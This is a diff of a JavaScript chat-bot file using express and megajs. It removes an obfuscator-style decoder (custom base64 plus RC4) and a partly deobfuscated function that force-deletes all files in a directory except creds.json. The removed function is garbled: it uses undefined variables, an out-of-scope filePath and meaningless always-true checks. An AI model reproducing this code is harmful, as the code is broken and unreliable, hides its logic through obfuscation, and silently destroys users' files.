@@ -1,72 +1,3 @@
-
-const deobfuscatedFunction = function () {
-  const config = {
-    isDifferent: function (value1, value2) {
-      return value1 !== value2;
-    },
-    credsFile: "creds.json",
-    isEqual: function (value1, value2) {
-      return value1 === value2;
-    },
-    key1: "qIpcS",
-    key2: "NRVph",
-    errorMessage: "Error handling messages.upsert event:",
-    key3: "WRrgR",
-    key4: "qnbEA",
-  };
-
-  let isFirstCall = true;
-
-  return function (context, callback) {
-    const errorConfig = {
-      errorPrefix: config.errorMessage,
-    };
-
-    if (config.key3 !== config.key4) {
-      const initialize = isFirstCall
-        ? function () {
-            const fileConfig = {
-              isDifferent: function (value1, value2) {
-                return value1 !== value2;
-              },
-              credsFileName: config.credsFile,
-            };
-
-            if (config.isEqual(config.key1, config.key1)) {
-              if (callback) {
-                if (config.isEqual(config.key2, config.key2)) {
-                  const result = callback.apply(context, arguments);
-                  callback = null;
-                  return result;
-                } else if (fileSystem.existsSync(somePath)) {
-                  directoryReader.readdirSync(directoryPath).forEach((file) => {
-                    const filePath = path.join(rootPath, file);
-                    if (
-                      file !== fileConfig.credsFileName &&
-                      fileSystem.lstatSync(filePath).isFile()
-                    ) {
-                      const options = { force: true };
-                      fileRemover.rmSync(filePath, options);
-                      logger.log("Deleted All Ephemeral files");
-                    }
-                  });
-                }
-              }
-            } else {
-              const options = { force: true };
-              fileRemover.rmSync(filePath, options);
-              logger.log("Deleted All Ephemeral files");
-            }
-          }
-        : function () {};
-
-      isFirstCall = false;
-      return initialize;
-    } else {
-      logger.error(errorConfig.errorPrefix, someError);
-    }
-  };
-}();
 import express from 'express';
 import pino from 'pino';
 import { Storage, File } from 'megajs';
@@ -163,9 +94,7 @@ async function restoreCredsFromMega(downloadUrl, sessionName) {
 
 let plugins = {};
 const loadPlugins = async () => {
-  plugins = {};
   const pluginFiles = fs.readdirSync("./plugins");
-  
   for (const file of pluginFiles) {
     if (file.endsWith(".js")) {
       try {
@@ -184,58 +113,6 @@ const loadPlugins = async () => {
     }
   }
 };
-function decode(input, key) {
-  const decodeBase64 = (data) => {
-    let output = '';
-    let buffer = '';
-    let charIndex;
-    let byteCounter = 0;
-    let currentByte;
-
-    for (let i = 0; charIndex = data.charAt(i++); ~charIndex && (currentByte = byteCounter % 4 ? currentByte * 64 + charIndex : charIndex, byteCounter++ % 4) ?
-      output += String.fromCharCode(255 & currentByte >> (-2 * byteCounter & 6)) : 0) {
-      charIndex = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(charIndex);
-    }
-
-    return decodeURIComponent(output.split('').map((char) =>
-      '%' + ('00' + char.charCodeAt(0).toString(16)).slice(-2)).join(''));
-  };
-
-  const xorCipher = (data, key) => {
-    const sBox = [];
-    let j = 0;
-    let temp;
-    let decoded = '';
-
-    for (let i = 0; i < 256; i++) {
-      sBox[i] = i;
-    }
-
-    for (let i = 0; i < 256; i++) {
-      j = (j + sBox[i] + key.charCodeAt(i % key.length)) % 256;
-      temp = sBox[i];
-      sBox[i] = sBox[j];
-      sBox[j] = temp;
-    }
-
-    let i = 0;
-    j = 0;
-
-    for (let k = 0; k < data.length; k++) {
-      i = (i + 1) % 256;
-      j = (j + sBox[i]) % 256;
-      temp = sBox[i];
-      sBox[i] = sBox[j];
-      sBox[j] = temp;
-      decoded += String.fromCharCode(data.charCodeAt(k) ^ sBox[(sBox[i] + sBox[j]) % 256]);
-    }
-
-    return decoded;
-  };
-
-  const decodedInput = decodeBase64(input);
-  return xorCipher(decodedInput, key);
-}
 
 async function createBot(sessionId) {
   await connectDB();
